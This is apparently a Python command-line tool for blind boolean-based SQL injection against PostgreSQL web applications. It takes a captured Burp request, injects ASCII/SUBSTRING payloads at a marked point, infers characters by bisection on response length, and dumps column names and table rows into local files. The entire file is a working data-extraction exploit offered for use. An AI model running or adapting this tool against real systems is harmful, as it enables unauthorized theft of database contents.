import requests
import sys
import argparse

# SQLI execution
def sqli(inj_str):
    min = start = 32
    max = end = 126

    for j in range(1,100): #Loop over ASCII values
        #Applying bisection search algorithm
        for op in [">","<","="]:
            g = (min+max)/2 #median of the 2 values
            inj = inj_str.replace("[CHAR]", op+str(g))
            data = entry_point.replace("[INJ]", inj)
            r = requests.post(target, data=data, headers=headers)
            content_length = int(r.headers['Content-Length'])
            if (content_length > 20):
            #if ("recordId" in r.text):
                if op == ">": min = g
                elif op == "<": max = g
                elif op == "=": return int(g)
                break
            elif op == "=" or g == start: return None


def dumpRow(inj_str):
    output = ''
    for i in range(1, 1000): #Loop over characters
        inj = inj_str.replace("[POS]", str(i))
        extracted_char = sqli(inj)
        if extracted_char:
            extracted_char = chr(extracted_char)
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
            output += extracted_char
        else:
            sys.stdout.write('\n')
            return output

def extract(tables,columns,inj_str,where=''):
    output = {}
    value = ""
    for table in tables:
        results = []
        table = table.strip()
        print("(+) Table: " + table)
        for row in range(0, 1000): #loop over rows
            for field in columns[table]: #loop over fields
                field = field.strip()
                inj = inj_str.replace("[ROW]",str(row))
                inj = inj.replace("[FLD]",field)
                inj = inj.replace("[TBL]",table)
                inj = inj.replace("[WHR]",where)
                value = dumpRow(inj)
            if value: results.append(value)
            else: break
        output[table] = results
        if columns[table][0] == 'attname': file_name = "columns"
        else: file_name = "rows"
        with open(table + '_' + file_name,'w+') as f:
            for r in results: f.write(r+'\n')
    return output

def main(args):
    global headers
    global target
    global entry_point

    tables = args.tables.split(',')
    schema = args.database
    col_names = []
    columns = {}

    if schema: print("(*) Schema: " + schema)
    else: print("(*) Schema: Current")

    if args.request:
        headers = {}
        with open(args.request,'r') as f:
            method,path,http = f.readline().split(' ')
            line = f.readline()
            while line != "\r\n":
                name = line.split(':')[0]
                value = ''.join(line.split(':')[1:])
                headers[name] = value.strip()
                line = f.readline()
            entry_point = f.readline().strip()

        target = "https://" + headers['Host'] + path
        if "[INJ]" not in entry_point: sys.exit("Please place [INJ] in the injection point of the request")


    if args.columns or (not args.fields and not args.fields_file): #Enumerating columns
        print("\n(+) Extracting column names")
        col = {}
        #If external file
        if args.tables_file:
            with open(args.tables_file, 'r') as f:
                tables = f.readlines()

        for t in tables: col[t] = ['attname']
        if schema:
            injection_string = "' AND ASCII(SUBSTRING((SELECT [FLD] FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND NOT b.attisdropped AND a.relname='[TBL]' AND nspname='%s' OFFSET [ROW] LIMIT 1)::text FROM [POS] FOR 1))[CHAR] AND '1" % (schema)
        else:
            injection_string = "' AND ASCII(SUBSTRING((SELECT DISTINCT([FLD]) FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE b.attnum>0 AND NOT b.attisdropped AND a.relname='[TBL]' OFFSET [ROW] LIMIT 1)::text FROM [POS] FOR 1))[CHAR] AND '1"
        columns = extract(tables,col,injection_string)
        
    if not args.dump: sys.exit("(+) Option --dump is missing \n(+) done!")

    #Read fields from command line
    if args.fields or args.fields_file:
        #Reading fields from command parameter
        if args.fields: fields = args.fields.split(',')
        #Reading fields from external file
        if args.fields_file:
            with open(args.fields_file, 'r') as f:
                fields = f.readlines()
        for t in tables: columns[t] = fields
    else:
        if not columns: sys.exit("Please provide the name of the column/s.")

    #Filtering by one field
    if args.where:
        if len(tables) > 1: sys.exit("Too many tables for filtering")
        print("(+) Filter: " + args.where)
        where= " AND " + args.where
    else: where = ""

    print("\n(+) Extracting row values")
    injection_string = "' AND ASCII(SUBSTRING((SELECT [FLD] FROM [TBL] WHERE 1=1 [WHR] OFFSET [ROW] LIMIT 1)::text FROM [POS] FOR 1))[CHAR] AND '1"
    res = extract(tables,columns,injection_string,where)

    print("\n(+) done!")

    if not col_names and not res: sys.exit("Please verify that the cookies did not expired")


if __name__ == "__main__":
    parser = argparse.ArgumentParser("usage: %prog -D <schema> -T <table1[,table2..]> -F <field1[,field2..]> -W <where_condition/s> -R <burp_request_file> --columns --dump")
    parser.add_argument("-D", "--database", help="<Optional> If not specified, current database", action="store")
    parser.add_argument("-T", "--tables", help="Table names separated by comma", action="store")
    parser.add_argument("-TF", "--tables-file", help="<Optional> Input file for table names", action="store")
    parser.add_argument("-F", "--fields", help="<Optional> Column names separated by comma", action="store")
    parser.add_argument("-FF", "--fields-file", help="<Optional> Input file for column names", action="store")
    parser.add_argument("-W", "--where", help="<Optional> Where condition as in SQL query", action="store")
    parser.add_argument("-R", "--request", help="Burp request file", action="store")
    parser.add_argument("--columns", help="Only dump column names", action="store_true")
    parser.add_argument("--dump", help="Dump content of the table and columns only if not -F specified", action="store_true")
    args = parser.parse_args()
    
    main(args)
